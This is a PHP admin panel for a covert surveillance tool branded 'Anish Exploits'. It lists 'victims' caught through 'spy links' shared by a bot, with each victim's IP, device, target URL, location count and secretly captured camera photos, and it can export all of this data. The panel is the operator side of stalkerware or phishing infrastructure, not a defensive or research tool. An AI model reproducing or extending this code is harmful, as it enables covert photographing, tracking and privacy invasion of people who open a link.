<?php
require_once 'config.php';

session_start();

// Login
if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['login'])) {
    if ($_POST['username'] == $config['admin_username'] && $_POST['password'] == $config['admin_password']) {
        $_SESSION['admin'] = true;
    }
}

if (!isset($_SESSION['admin']) || $_SESSION['admin'] !== true) {
    ?>
    <!DOCTYPE html>
    <html>
    <head><title>Admin Login</title>
    <style>
        * { margin:0; padding:0; box-sizing:border-box; }
        body { background: #0f0c29; color: white; font-family: Arial; display: flex; justify-content: center; align-items: center; height: 100vh; }
        .login-box { background: rgba(255,255,255,0.05); padding: 40px; border-radius: 20px; width: 320px; text-align: center; border: 1px solid rgba(255,255,255,0.05); }
        .login-box h2 { margin-bottom: 20px; color: #f7971e; }
        input { width: 100%; padding: 14px; margin: 10px 0; border: none; border-radius: 12px; background: rgba(255,255,255,0.08); color: white; font-size: 14px; }
        input::placeholder { color: #666; }
        button { width: 100%; padding: 14px; background: linear-gradient(45deg, #f7971e, #ffd200); border: none; border-radius: 12px; font-weight: bold; cursor: pointer; font-size: 16px; margin-top: 10px; }
        button:hover { opacity: 0.9; }
    </style>
    </head>
    <body>
        <div class="login-box">
            <h2>🔐 Admin Login</h2>
            <form method="POST">
                <input type="text" name="username" placeholder="Username" required>
                <input type="password" name="password" placeholder="Password" required>
                <button type="submit" name="login">Login</button>
            </form>
        </div>
    </body>
    </html>
    <?php
    exit;
}

$visitors = json_decode(file_get_contents("visitors.json"), true) ?? [];
$links = json_decode(file_get_contents("links.json"), true) ?? [];
$totalVictims = count($visitors);
?>
<!DOCTYPE html>
<html>
<head>
    <title>Admin - Anish Exploits</title>
    <style>
        * { margin:0; padding:0; box-sizing:border-box; }
        body { background: #0f0c29; color: white; font-family: Arial; padding: 20px; }
        .header { display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 15px; }
        .stats { display: flex; gap: 15px; flex-wrap: wrap; margin: 20px 0; }
        .stat-box { background: rgba(255,255,255,0.05); padding: 18px 25px; border-radius: 15px; flex: 1; min-width: 100px; text-align: center; border: 1px solid rgba(255,255,255,0.05); }
        .stat-box h2 { font-size: 32px; color: #f7971e; }
        .stat-box p { color: #888; font-size: 13px; }
        .btn { background: #f7971e; color: black; padding: 8px 18px; border: none; border-radius: 10px; cursor: pointer; margin: 3px; font-weight: 600; text-decoration: none; display: inline-block; }
        .btn:hover { background: #ffd200; }
        .btn-danger { background: #ef4444; color: white; }
        .btn-danger:hover { background: #dc2626; }
        .visitor-card { background: rgba(255,255,255,0.03); border-radius: 15px; padding: 20px; margin: 15px 0; border: 1px solid rgba(255,255,255,0.05); }
        .visitor-card h3 { color: #f7971e; margin-bottom: 8px; }
        .info { color: #aaa; font-size: 13px; margin: 4px 0; }
        .info strong { color: #ddd; }
        .photo-grid { display: flex; flex-wrap: wrap; gap: 8px; margin: 10px 0; }
        .photo-grid img { width: 80px; height: 80px; object-fit: cover; border-radius: 8px; border: 2px solid rgba(255,255,255,0.08); }
        .badge { display: inline-block; padding: 2px 10px; border-radius: 20px; font-size: 12px; background: rgba(255,255,255,0.05); }
        .badge.good { background: rgba(74, 222, 128, 0.15); color: #4ade80; }
        .empty { color: #666; text-align: center; padding: 40px; }
        .creator-tag { color: #f7971e; font-size: 12px; background: rgba(247, 151, 30, 0.1); padding: 2px 10px; border-radius: 10px; }
        .link-item { background: rgba(255,255,255,0.03); padding: 10px 15px; border-radius: 10px; margin: 5px 0; display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; }
    </style>
</head>
<body>
    <div class="header">
        <h1>👾 Admin Panel - Anish Exploits</h1>
        <div>
            <a href="?export=json" class="btn">📥 Export</a>
            <a href="?clear=all" class="btn btn-danger" onclick="return confirm('Delete ALL data?')">🗑️ Clear</a>
            <a href="?logout=1" class="btn btn-danger">🚪 Logout</a>
        </div>
    </div>
    
    <div class="stats">
        <div class="stat-box"><h2><?= $totalVictims ?></h2><p>Total Victims</p></div>
        <?php
        $totalPhotos = 0;
        foreach ($visitors as $v) {
            $totalPhotos += $v['photos'] ?? 0;
        }
        ?>
        <div class="stat-box"><h2><?= $totalPhotos ?></h2><p>Photos Captured</p></div>
        <div class="stat-box"><h2><?= count($links) ?></h2><p>Spy Links Created</p></div>
    </div>

    <div style="margin:20px 0;">
        <h3>🔗 All Spy Links</h3>
        <?php foreach ($links as $code => $data): ?>
            <div class="link-item">
                <span><strong><?= $code ?></strong> → <?= $data['url'] ?></span>
                <span class="creator-tag">Created by: <?= $data['created_by'] ?></span>
                <span style="color:#666;font-size:12px;"><?= $data['created_at'] ?></span>
            </div>
        <?php endforeach; ?>
    </div>

    <?php
    // Export JSON
    if (isset($_GET['export'])) {
        header('Content-Type: application/json');
        header('Content-Disposition: attachment; filename="visitors_data_'.date('Y-m-d').'.json"');
        echo json_encode($visitors, JSON_PRETTY_PRINT);
        exit;
    }
    
    // Clear all
    if (isset($_GET['clear'])) {
        file_put_contents("visitors.json", json_encode([]));
        file_put_contents("links.json", json_encode([]));
        $files = glob("photos/*.jpg");
        foreach ($files as $file) @unlink($file);
        echo "<script>location.href='?'</script>";
        exit;
    }
    
    // Logout
    if (isset($_GET['logout'])) {
        session_destroy();
        echo "<script>location.href='?'</script>";
        exit;
    }

    // Display visitors
    if (empty($visitors)):
    ?>
        <div class="empty">
            <h2 style="font-size:24px;margin-bottom:10px;">📭 No Victims Yet</h2>
            <p>Generate a spy link from your bot and share it!</p>
        </div>
    <?php else: ?>
        <h3>📋 All Victims</h3>
        <?php foreach ($visitors as $id => $data): ?>
            <div class="visitor-card">
                <h3>🆔 <?= $id ?></h3>
                <div class="info"><strong>📱 Device:</strong> <?= substr($data['device'] ?? 'Unknown', 0, 60) ?></div>
                <div class="info"><strong>🌐 IP:</strong> <?= $data['ip'] ?? 'Unknown' ?></div>
                <div class="info"><strong>🎯 Target:</strong> <?= $data['target_url'] ?? 'N/A' ?></div>
                <div class="info"><strong>👤 Generated By:</strong> <?= $data['generated_by'] ?? 'Unknown' ?></div>
                <div class="info"><strong>📅 First Seen:</strong> <?= $data['time'] ?? 'N/A' ?></div>
                <div class="info">
                    <strong>📊 Stats:</strong> 
                    <span class="badge good">📸 <?= $data['photos'] ?? 0 ?></span>
                    <span class="badge good">📍 <?= $data['locations'] ?? 0 ?></span>
                    <span class="badge good">🔋 <?= $data['battery'] ?? 0 ?></span>
                </div>
                
                <?php 
                $photoFiles = glob("photos/{$id}_*.jpg");
                if (!empty($photoFiles)):
                    $recentPhotos = array_slice($photoFiles, -5);
                ?>
                    <div class="photo-grid">
                        <?php foreach ($recentPhotos as $photo): ?>
                            <img src="<?= $photo ?>" alt="Photo" loading="lazy">
                        <?php endforeach; ?>
                    </div>
                <?php endif; ?>
            </div>
        <?php endforeach; ?>
    <?php endif; ?>
</body>
</html>